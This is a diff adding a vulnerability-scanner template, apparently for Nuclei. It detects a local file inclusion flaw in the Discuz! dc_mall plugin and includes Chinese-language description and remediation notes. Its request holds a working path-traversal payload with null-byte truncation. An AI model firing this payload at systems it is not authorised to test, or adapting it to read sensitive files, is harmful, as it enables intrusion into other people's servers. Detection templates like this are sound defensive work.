@@ -1,0 +1,36 @@
+id: wooyun-2015-0131386
+info:
+  name: Discuz dc_mall插件 本地文件包含漏洞
+  author:
+  - 折跃
+  description: |-
+    Discuz! dc_mall插件本地文件包含漏洞
+    Discuz!是一套通用的社区论坛软件系统。
+
+    Discuz!的dc_mall插件存在本地文件包含漏洞，攻击者可利用该漏洞访问受限目录之外的位置进行文件包含攻击，以导致包含本地文件时执行代码。
+  severity: high
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    http://discuz.net/
+
+    临时修复方案：
+    1、PHP 中使用 open_basedir 配置限制访问在指定的区域，路径长短截断
+    2、过滤.（点）/（反斜杠）\（反斜杠），编码绕过
+    3、禁止服务器远程文件包含
+    4、对于限制了包含文件后缀的情况，需禁止%00截断（PHP更新到最新版本）。PHP版本小于5.3，php.ini magic_quotes_gpc = off，对可控参数未使用addslashes函数，满足这三个条件就可以使用%00截断。
+    5、问号、井号、空格绕过（远程）
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,'User-agent')
+    - contains(body,'Disallow')
+  path:
+  - '{{BaseURL}}/plugin.php?id=dc_mall&action=../../../../../robots.txt%00'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
